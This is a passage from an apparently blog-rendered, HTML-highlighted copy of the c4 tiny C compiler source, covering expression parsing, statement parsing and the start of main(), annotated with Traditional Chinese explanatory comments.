class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 7.解析指標取值</span></span><br><span class="line"><span class="string">  else if (tk == Mul) &#123;//取指標指向值</span></span><br><span class="line"><span class="string">//recursive-descent call expr()，然後 check type 是否為一階 pointer type (semantic analyzer)，dereference semantic analyze 的過程為 ty=ty-PTR</span></span><br><span class="line"><span class="string">    next(); expr(Inc);//高優先權</span></span><br><span class="line"><span class="string">    if (ty &gt; INT) ty = ty - PTR; else &#123; printf(&quot;</span>%d: bad dereference\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = (ty == CHAR) ? LC : LI;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &#125;// 8、解析取址操作</span></span><br><span class="line"><span class="string">  else if (tk == And) &#123;//address-of 的部分直接把 LI/LC command 砍掉，register 所存的就會是位址；相較於 derefernece 而言，register 存的是真正的值。//&amp;,取位址操作</span></span><br><span class="line"><span class="string">    next(); expr(Inc);</span></span><br><span class="line"><span class="string">    if (*e == LC || *e == LI) --e; else &#123; printf(&quot;</span>%d: bad address-of\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    ty = ty + PTR;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 9、解析運算符號表達式</span></span><br><span class="line"><span class="string">//expr() 回傳的值會存在 register，因此這邊要產生的 IR 要先把結果 Push 回 stack，然後再設定 register value，最後做運算，結果會 restore into register。</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;!&#x27;) &#123; next(); expr(Inc); *++e = PSH; *++e = IMM; *++e = 0; *++e = EQ; ty = INT; &#125;//!x相當於x==0</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;~&#x27;) &#123; next(); expr(Inc); *++e = PSH; *++e = IMM; *++e = -1; *++e = XOR; ty = INT; &#125;//~x 相當於x ^ -1</span></span><br><span class="line"><span class="string">  else if (tk == Add) &#123; next(); expr(Inc); ty = INT; &#125;</span></span><br><span class="line"><span class="string">  //處理 expr 開頭是 +/- 的 case。</span></span><br><span class="line"><span class="string">	else if (tk == Add) &#123; next(); expr(Inc); ty = INT; &#125;</span></span><br><span class="line"><span class="string">  else if (tk == Sub) &#123;</span></span><br><span class="line"><span class="string">    next(); *++e = IMM;//數值,取負</span></span><br><span class="line"><span class="string">    if (tk == Num) &#123; *++e = -ival; next(); &#125;</span></span><br><span class="line"><span class="string"> else &#123; *++e = -1; *++e = PSH; expr(Inc); *++e = MUL; &#125;//乘-1</span></span><br><span class="line"><span class="string">    ty = INT;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 10、解析自增、自減</span></span><br><span class="line"><span class="string">//pre-increment/pre-decrement：透過插入 Push command 將 register 的值存入 stack 中。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//expr() 第一部分處理的都是 expression 開頭的部分，接著第二部分將會展示如何使用 operator-precedence 處理 operator 優先權。</span></span><br><span class="line"><span class="string">  else if (tk == Inc || tk == Dec) &#123;//處理++x,--x//x--,x++在後面處理</span></span><br><span class="line"><span class="string">    t = tk; next(); expr(Inc);</span></span><br><span class="line"><span class="string">//處理++x,--x</span></span><br><span class="line"><span class="string">    if (*e == LC) &#123; *e = PSH; *++e = LC; &#125;//位址壓棧(下面SC/SI用到),再取數</span></span><br><span class="line"><span class="string">    else if (*e == LI) &#123; *e = PSH; *++e = LI; &#125;</span></span><br><span class="line"><span class="string">    else &#123; printf(&quot;</span>%d: bad lvalue in pre-increment\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = PSH;//將數值壓棧</span></span><br><span class="line"><span class="string">    *++e = IMM; *++e = (ty &gt; PTR) ? sizeof(int) : sizeof(char);//指標則加減一字,否則加減1</span></span><br><span class="line"><span class="string">    *++e = (t == Inc) ? ADD : SUB;//運算</span></span><br><span class="line"><span class="string">    *++e = (ty == CHAR) ? SC : SI;//存回變數</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123; printf(&quot;</span>%d: bad expression\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">//使用 switch，但是 c4 並不支援 switch，因此才會採用多個 if-else。</span></span><br><span class="line"><span class="string">//Operator precedence (parsing)，主要處理四則運算。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//爬山法</span></span><br><span class="line"><span class="string">  //tk為ASCII碼的都不會超過Num=128</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  while (tk &gt;= lev) &#123; // &quot;</span>precedence climbing<span class="string">&quot; or &quot;</span>Top Down Operator Precedence<span class="string">&quot; method</span></span><br><span class="line"><span class="string">    t = ty;//ty在遞迴過程中可能會改變,所以備份目前處理的表達式類型</span></span><br><span class="line"><span class="string">// 11、解析賦值運算</span></span><br><span class="line"><span class="string">//將暫存器的位址 push 到 stack 中，做完後面的運算後，結果通常都會在暫存器中，因此透過 SC/SI 將暫存器的值存到 stack 中的位址。</span></span><br><span class="line"><span class="string">    if (tk == Assign) &#123;//賦值</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      if (*e == LC || *e == LI) *e = PSH;//左邊被tk=Id中變數部分處理過了,將位址壓棧</span></span><br><span class="line"><span class="string">			 else &#123; printf(&quot;</span>%d: bad lvalue in assignment\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      expr(Assign); *++e = ((ty = t) == CHAR) ? SC : SI;SC : SI;//取得右值expr的值,作為a=expr的結果</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//處理類似 x=y?a:b 判斷式，保留 BZ 指令後面要填位址的空間</span></span><br><span class="line"><span class="string">//然後進行 recursive descent parser for expression，然後塞入 JMP 指令</span></span><br><span class="line"><span class="string">//且一樣保留後面要填位址的空間，展開最後的 expression 後，再填入要 JMP 的位址。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 12、解析三目運算符</span></span><br><span class="line"><span class="string">    else if (tk == Cond) &#123;//x?a:b和if類似,除了不能沒有else</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      *++e = BZ; d = ++e;</span></span><br><span class="line"><span class="string">      expr(Assign);</span></span><br><span class="line"><span class="string">      if (tk == &#x27;:&#x27;) next(); else &#123; printf(&quot;</span>%d: conditional missing colon\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *d = (int)(e + 3); *++e = JMP; d = ++e;</span></span><br><span class="line"><span class="string">      expr(Cond);</span></span><br><span class="line"><span class="string">      *d = (int)(e + 1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//通常牽扯到 Branch/Jump 指令的都會使用類似這種方法：先保留目標位址，等待後面的指令都確定後，才會知道目標位址。</span></span><br><span class="line"><span class="string">    else if (tk == Lor) &#123; next(); *++e = BNZ; d = ++e; expr(Lan); *d = (int)(e + 1); ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Lan) &#123; next(); *++e = BZ;  d = ++e; expr(Or);  *d = (int)(e + 1); ty = INT; &#125;</span></span><br><span class="line"><span class="string"> /*</span></span><br><span class="line"><span class="string">這邊運算子的概念就是先將數值 push into stack frame，然後利用 operator-precedence</span></span><br><span class="line"><span class="string">展開後面的 expression，展開的結果通常會存在 register，</span></span><br><span class="line"><span class="string">運算相關的 command 通常是拿 register 和 stack 做運算，然後將結果存回 register。</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">		else if (tk == Or)  &#123; next(); *++e = PSH; expr(Xor); *++e = OR;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Xor) &#123; next(); *++e = PSH; expr(And); *++e = XOR; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == And) &#123; next(); *++e = PSH; expr(Eq);  *++e = AND; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Eq)  &#123; next(); *++e = PSH; expr(Lt);  *++e = EQ;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Ne)  &#123; next(); *++e = PSH; expr(Lt);  *++e = NE;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Lt)  &#123; next(); *++e = PSH; expr(Shl); *++e = LT;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Gt)  &#123; next(); *++e = PSH; expr(Shl); *++e = GT;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Le)  &#123; next(); *++e = PSH; expr(Shl); *++e = LE;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Ge)  &#123; next(); *++e = PSH; expr(Shl); *++e = GE;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Shl) &#123; next(); *++e = PSH; expr(Add); *++e = SHL; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Shr) &#123; next(); *++e = PSH; expr(Add); *++e = SHR; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    //這邊同時處理 pointer 的加法：因為一次 add 一個「單位」。</span></span><br><span class="line"><span class="string">		//int *a;</span></span><br><span class="line"><span class="string">		//c=a+b;</span></span><br><span class="line"><span class="string">		else if (tk == Add) &#123;</span></span><br><span class="line"><span class="string">      next(); *++e = PSH; expr(Mul);</span></span><br><span class="line"><span class="string">      if ((ty = t) &gt; PTR) &#123; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = MUL;  &#125;//處理指針</span></span><br><span class="line"><span class="string">      *++e = ADD;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//發現多了一個 if 判斷式，這是在處理指標相減計算中間的個數。</span></span><br><span class="line"><span class="string">    else if (tk == Sub) &#123;</span></span><br><span class="line"><span class="string">      next(); *++e = PSH; expr(Mul);</span></span><br><span class="line"><span class="string">      if (t &gt; PTR &amp;&amp; t == ty) &#123; *++e = SUB; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = DIV; ty = INT; &#125;//指標相減</span></span><br><span class="line"><span class="string">      else if ((ty = t) &gt; PTR) &#123; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = MUL; *++e = SUB; &#125;//指標減數值</span></span><br><span class="line"><span class="string">      else *++e = SUB;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Mul) &#123; next(); *++e = PSH; expr(Inc); *++e = MUL; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Div) &#123; next(); *++e = PSH; expr(Inc); *++e = DIV; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Mod) &#123; next(); *++e = PSH; expr(Inc); *++e = MOD; ty = INT; &#125;</span></span><br><span class="line"><span class="string">//post-increment 的做法就是先改變 variable 在 stack 中的值，然後再回復成原來的值，並且存在 register 中，最後再進行運算。</span></span><br><span class="line"><span class="string">    else if (tk == Inc || tk == Dec) &#123;</span></span><br><span class="line"><span class="string">      if (*e == LC) &#123; *e = PSH; *++e = LC; &#125;</span></span><br><span class="line"><span class="string">      else if (*e == LI) &#123; *e = PSH; *++e = LI; &#125;</span></span><br><span class="line"><span class="string">      else &#123; printf(&quot;</span>%d: bad lvalue in post-increment\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *++e = PSH; *++e = IMM; *++e = (ty &gt; PTR) ? sizeof(int) : sizeof(char);</span></span><br><span class="line"><span class="string">      *++e = (tk == Inc) ? ADD : SUB;//先自增/自減</span></span><br><span class="line"><span class="string">      *++e = (ty == CHAR) ? SC : SI;//存到記憶體裡</span></span><br><span class="line"><span class="string">      *++e = PSH; *++e = IMM; *++e = (ty &gt; PTR) ? sizeof(int) : sizeof(char);</span></span><br><span class="line"><span class="string">      *++e = (tk == Inc) ? SUB : ADD;//再反轉操作，保證後自增/自減不影響這次表達式的求值 //PS:我終於知道哪些a=1;b=a+++a++為啥等於3了</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//這部分是處理 array index 的取值到 register 中，中間必須處理一個 array 單位乘以 index，以計算最終位址。</span></span><br><span class="line"><span class="string">    else if (tk == Brak) &#123;// 備份下標</span></span><br><span class="line"><span class="string">      next(); *++e = PSH; expr(Assign);//儲存備份配額,計算下標</span></span><br><span class="line"><span class="string">      if (tk == &#x27;]&#x27;) next(); else &#123; printf(&quot;</span>%d: close bracket expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      if (t &gt; PTR) &#123; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = MUL;  &#125;//t==PTR時是Char,Char = 0</span></span><br><span class="line"><span class="string">      else if (t &lt; PTR) &#123; printf(&quot;</span>%d: pointer type expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *++e = ADD;</span></span><br><span class="line"><span class="string">      *++e = ((ty = t - PTR) == CHAR) ? LC : LI;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else &#123; printf(&quot;</span>%d: compiler error tk=%d\n<span class="string">&quot;, line, tk); exit(-1); &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//處理 “if-else”, “while”, “return”, “&#123;&#125;”, “;”</span></span><br><span class="line"><span class="string">//語句分析</span></span><br><span class="line"><span class="string">void stmt()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  int *a, *b;</span></span><br><span class="line"><span class="string">//*a:代表條件為false時跳到的語句</span></span><br><span class="line"><span class="string">  //*b:為了防止順序執行if-else程式碼,所以執行了true部分時應跳過false部分</span></span><br><span class="line"><span class="string">// 1、解析if語句</span></span><br><span class="line"><span class="string">  if (tk == If) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    if (tk == &#x27;(&#x27;) </span></span><br><span class="line"><span class="string">		next(); </span></span><br><span class="line"><span class="string">		else &#123; printf(&quot;</span>%d: open paren expected\n<span class="string">&quot;, line); </span></span><br><span class="line"><span class="string">		exit(-1); &#125;</span></span><br><span class="line"><span class="string">    expr(Assign);</span></span><br><span class="line"><span class="string">    if (tk == &#x27;)&#x27;) </span></span><br><span class="line"><span class="string">		next(); </span></span><br><span class="line"><span class="string">		else &#123; </span></span><br><span class="line"><span class="string">		printf(&quot;</span>%d: close paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = BZ;//branch if zero</span></span><br><span class="line"><span class="string">		 b = ++e;//branch address pointer</span></span><br><span class="line"><span class="string">    stmt();// 繼續分析</span></span><br><span class="line"><span class="string">    if (tk == Else) &#123;</span></span><br><span class="line"><span class="string">      *b = (int)(e + 3); // e + 3 位置是else 起始位置</span></span><br><span class="line"><span class="string">			*++e = JMP; </span></span><br><span class="line"><span class="string">			b = ++e; // if 語句 else 之前插入 JMP 跳過Else 部分 // JMP目標</span></span><br><span class="line"><span class="string">			</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      stmt();//分析else 部分</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *b = (int)(e + 1);//if 語句結束,無論是if BZ 跳轉目標或是 else 之前的JMP的跳轉目標</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 2、解析while語句</span></span><br><span class="line"><span class="string">  else if (tk == While) &#123;//循環</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    a = e + 1;// While 迴圈體起始位址</span></span><br><span class="line"><span class="string">    if (tk == &#x27;(&#x27;) next(); else &#123; printf(&quot;</span>%d: open paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    expr(Assign);</span></span><br><span class="line"><span class="string">    if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: close paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = BZ;</span></span><br><span class="line"><span class="string">		 b = ++e;//b = While 語句結束後位址</span></span><br><span class="line"><span class="string">    stmt();//處理While 語句體</span></span><br><span class="line"><span class="string">    *++e = JMP; *++e = (int)a;//無條件跳到While語句開始(包含循環條件的程式碼),實作循環</span></span><br><span class="line"><span class="string">    *b = (int)(e + 1);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 3.解析return語句</span></span><br><span class="line"><span class="string">  else if (tk == Return) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    if (tk != &#x27;;&#x27;) expr(Assign);// 3.解析return語句</span></span><br><span class="line"><span class="string">    *++e = LEV;// 銷毀函式呼叫棧</span></span><br><span class="line"><span class="string">    if (tk == &#x27;;&#x27;) next(); else &#123; printf(&quot;</span>%d: semicolon expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">//解析複合語句</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;&#123;&#x27;) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    while (tk != &#x27;&#125;&#x27;) stmt();//複合語句</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 5、解析單句</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;;&#x27;) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;</span></span><br><span class="line"><span class="string">    expr(Assign);;//一般的語句認為是賦值語句/表達式</span></span><br><span class="line"><span class="string">    if (tk == &#x27;;&#x27;) next(); else &#123; printf(&quot;</span>%d: semicolon expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main(int argc, char **argv)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	//fd file descriptor 檔案描述</span></span><br><span class="line"><span class="string">  //bt basetype</span></span><br><span class="line"><span class="string">  //poolsz 一系列池的大小</span></span><br><span class="line"><span class="string">  //ty type 記錄目前標識的類型</span></span><br><span class="line"><span class="string">  int fd, bt, ty, poolsz, *idmain;</span></span><br><span class="line"><span class="string">  int *pc, *sp, *bp, a, cycle; // vm registers 虛擬器的暫存器</span></span><br><span class="line"><span class="string">  int i, *t; // temps</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --argc; ++argv;</span></span><br><span class="line"><span class="string">  if (argc &gt; 0 &amp;&amp; **argv == &#x27;-&#x27; &amp;&amp; (*argv)[1] == &#x27;s&#x27;) &#123; src = 1; --argc; ++argv; &#125;</span></span><br><span class="line"><span class="string">  if (argc &gt; 0 &amp;&amp; **argv == &#x27;-&#x27; &amp;&amp; (*argv)[1] == &#x27;d&#x27;) &#123; debug = 1; --argc; ++argv; &#125;</span></span><br><span class="line"><span class="string">  if (argc &lt; 1) &#123; printf(&quot;</span>usage: c4 [-s] [-d] file ...\n<span class="string">&quot;); return -1; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  if ((fd = open(*argv, 0)) &lt; 0) &#123; printf(&quot;</span>could not open(%s)\n<span class="string">&quot;, *argv); return -1; &#125;</span></span><br><span class="line"><span class="string">//Symbol Table and Stack Frame 的大小都是 256KB。//開啟原始檔並讀取到src_pos中</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sym：symbol table.</span></span><br><span class="line"><span class="string">e：Assembly Code(IR) output.</span></span><br><span class="line"><span class="string">le：last print IR.</span></span><br><span class="line"><span class="string">sp：Stack Frame.</span></span><br><span class="line"><span class="string">data：data section.</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">//poolsz = 256*1024; // 大小</span></span><br><span class="line"><span class="string">  //給各區域申請空間</span></span><br><span class="line"><span class="string">  poolsz = 256*1024; // arbitrary size</span></span><br><span class="line"><span class="string">  if (!(sym = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) symbol area\n<span class="string">&quot;, poolsz); return -1; &#125;//符號表</span></span><br><span class="line"><span class="string">  if (!(le = e = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) text area\n<span class="string">&quot;, poolsz); return -1; &#125;//文字段</span></span><br><span class="line"><span class="string">  if (!(data = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) data area\n<span class="string">&quot;, poolsz); return -1; &#125;//資料段</span></span><br><span class="line"><span class="string">  if (!(sp = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) <span class="built_in">stack</span> area\n<span class="string">&quot;, poolsz); return -1; &#125;//棧</span></span><br><span class="line"><span class="string">// 起始位置</span></span><br><span class="line"><span class="string">  memset(sym,  0, poolsz);</span></span><br><span class="line"><span class="string">  memset(e,    0, poolsz);</span></span><br><span class="line"><span class="string">  memset(data, 0, poolsz);</span></span><br><span class="line"><span class="string">//根據 enum 從 Char 到 While 一一加入 symbol table 中。</span></span><br><span class="line"><span class="string">//在 next() function 中 id 將會指到 sym =&gt; id = sym; // unwind symbol table locals.</span></span><br><span class="line"><span class="string">// 用詞法分析器先把這些關鍵字放進符號表</span></span><br><span class="line"><span class="string">  p = &quot;</span><span class="type">char</span> <span class="keyword">else</span> <span class="keyword">enum</span> <span class="keyword">if</span> <span class="type">int</span> <span class="keyword">return</span> <span class="keyword">sizeof</span> <span class="keyword">while</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">      &quot;</span>open read close <span class="built_in">printf</span> <span class="built_in">malloc</span> <span class="built_in">free</span> <span class="built_in">memset</span> <span class="built_in">memcmp</span> <span class="built_in">exit</span> <span class="type">void</span> main<span class="string">&quot;;</span></span><br><span class="line"><span class="string">// 預先把關鍵字加進去,id[Tk]修改為和Enum一致</span></span><br><span class="line"><span class="string">  i = Char; while (i &lt;= While) &#123; next(); id[Tk] = i++; &#125; // add keywords to symbol table 從 next() 新增 id(symbol) 之後，會再重新設定 token enum value。</span></span><br><span class="line"><span class="string">//預先把[庫]裡定義的符號(系統函數等) 加進去 Class 賦值為Sys</span></span><br><span class="line"><span class="string">//接下來處理 system call library，從 next() 新增 id(symbol) 之後，會再設定 token class, type, and value。</span></span><br><span class="line"><span class="string">  i = OPEN; while (i &lt;= EXIT) &#123; next(); id[Class] = Sys; id[Type] = INT; id[Val] = i++; &#125; // add library to symbol table</span></span><br><span class="line"><span class="string">// void 認為是char，不支援void類型，將void轉為char</span></span><br><span class="line"><span class="string">  //處理 void and main keyword，另外使用 idmain 紀錄 main `在 symbol table 的位置。</span></span><br><span class="line"><span class="string">	next(); id[Tk] = Char; // handle void type</span></span><br><span class="line"><span class="string">// 記錄main函數的符號id</span></span><br><span class="line"><span class="string">  next(); idmain = id; //指向main函數對應的符號表條目</span></span><br><span class="line"><span class="string">//讀取 source code 到 p(lp=p) 所指的位址，並且關閉 FD。</span></span><br><span class="line"><span class="string">  if (!(lp = p = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) source area\n<span class="string">&quot;, poolsz); return -1; &#125;</span></span><br><span class="line"><span class="string">  if ((i = read(fd, p, poolsz-1)) &lt;= 0) &#123; printf(&quot;</span>read() returned %d\n<span class="string">&quot;, i); return -1; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	p[i] = 0;//字串結尾置0</span></span><br><span class="line"><span class="string">  close(fd);//釋放資源</span></span><br><span class="line"><span class="string">  p[i] = 0;</span></span><br><span class="line"><span class="string">  close(fd);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  // parse declarations</span></span><br><span class="line"><span class="string">//在 main() 中，以上面這個 while loop 來 parsing tokens，直到 tk=‘\0’。</span></span><br><span class="line"><span class="string">// 語法分析</span></span><br><span class="line"><span class="string">  line = 1;</span></span><br><span class="line"><span class="string">  next();</span></span><br><span class="line"><span class="string">  while (tk) &#123;</span></span><br><span class="line"><span class="string">//前面兩個 if 分別處理 INT and CHAR，最後一個 if 處理 enum：使用 local variable i 來處理 value of enum id。</span></span><br><span class="line"><span class="string">    bt = INT; // basetype</span></span><br><span class="line"><span class="string">    if (tk == Int) next();//已經有bt == INT</span></span><br><span class="line"><span class="string">    else if (tk == Char) &#123; next(); bt = CHAR; &#125;//char 變數;</span></span><br><span class="line"><span class="string">    else if (tk == Enum) &#123;</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      if (tk != &#x27;&#123;&#x27;) next();// 似乎忽略了枚舉名,例如 enum xxx&#123;&#125;，去除多餘的空格</span></span><br><span class="line"><span class="string">      if (tk == &#x27;&#123;&#x27;) &#123;</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">        i = 0;//Enum 預設從0 開始</span></span><br><span class="line"><span class="string">        while (tk != &#x27;&#125;&#x27;) &#123;//enum賦值有兩種方式,一種預設從0開始,還有一種可以自己進行賦值</span></span><br><span class="line"><span class="string">				//情況1</span></span><br><span class="line"><span class="string">          if (tk != Id) &#123; printf(&quot;</span>%d: bad <span class="keyword">enum</span> identifier %d\n<span class="string">&quot;, line, tk); return -1; &#125;//不是Identifier 就出錯</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          if (tk == Assign) &#123;// 發現賦值語句 如 enum &#123; Num = 128 &#125;;</span></span><br><span class="line"><span class="string">            next();</span></span><br><span class="line"><span class="string">            if (tk != Num) &#123; printf(&quot;</span>%d: bad <span class="keyword">enum</span> initializer\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">            i = ival;</span></span><br><span class="line"><span class="string">            next();</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">//將目前的標識加入符號表中</span></span><br><span class="line"><span class="string">          id[Class] = Num; id[Type] = INT; id[Val] = i++;</span></span><br><span class="line"><span class="string">          if (tk == &#x27;,&#x27;) next();//還沒結束,跳過逗號</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//解析函數宣告或變數定義</span></span><br><span class="line"><span class="string">//處理 Global variables and Functions。</span></span><br><span class="line"><span class="string">    while (tk != &#x27;;&#x27; &amp;&amp; tk != &#x27;&#125;&#x27;) &#123;</span></span><br><span class="line"><span class="string">      ty = bt;</span></span><br><span class="line"><span class="string">// tk == Mul 表示已*開頭,為指針類型,型別加PTR表示何種類型的指針</span></span><br><span class="line"><span class="string">      while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;</span></span><br><span class="line"><span class="string">//check 是否有重複宣告，是屬於 semantic analyzer 的一部份。</span></span><br><span class="line"><span class="string">      if (tk != Id) &#123; printf(&quot;</span>%d: bad global declaration\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">      if (id[Class]) &#123; printf(&quot;</span>%d: duplicate global definition\n<span class="string">&quot;, line); return -1; &#125;//重複全域變數定義,解釋見後</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      id[Type] = ty;//賦值型別</span></span><br><span class="line"><span class="string">//這邊開始處理 Function declaration。</span></span><br><span class="line"><span class="string">      if (tk == &#x27;(&#x27;) &#123; // 函數</span></span><br><span class="line"><span class="string">//Symbol table 的 class 設定為 Fun 類型，然後將 value 設定為 IR command 的 下個指令(Function 第一個指令)的位址。</span></span><br><span class="line"><span class="string">        id[Class] = Fun;//型別為函數型</span></span><br><span class="line"><span class="string">        id[Val] = (int)(e + 1);//函數指標? 在字節碼中的偏移量/位址</span></span><br><span class="line"><span class="string">        next(); i = 0;</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">這邊會檢查是否重複宣告 parameter。</span></span><br><span class="line"><span class="string">然後將 Symbol table 的資訊 (Class, type, Val) 備份到 HClass, HType, HVal，</span></span><br><span class="line"><span class="string">這邊是實作在 function 內部更改 local variable’s value 將不會影響到 Function 以外的 scope，parameter 也算是 Function local variables。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">        while (tk != &#x27;)&#x27;) &#123;//參數列表</span></span><br><span class="line"><span class="string">          ty = INT;</span></span><br><span class="line"><span class="string">          if (tk == Int) next();</span></span><br><span class="line"><span class="string">          else if (tk == Char) &#123; next(); ty = CHAR; &#125;</span></span><br><span class="line"><span class="string">          while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;//</span></span><br><span class="line"><span class="string">          if (tk != Id) &#123; printf(&quot;</span>%d: bad parameter declaration\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">					if (id[Class] == Loc) &#123; printf(&quot;</span>%d: duplicate parameter definition\n<span class="string">&quot;, line); return -1; &#125;//函數參數是局部變量</span></span><br><span class="line"><span class="string">          id[HClass] = id[Class]; id[Class] = Loc;</span></span><br><span class="line"><span class="string">          id[HType]  = id[Type];  id[Type] = ty;</span></span><br><span class="line"><span class="string">          id[HVal]   = id[Val];   id[Val] = i++;//局部變數編號</span></span><br><span 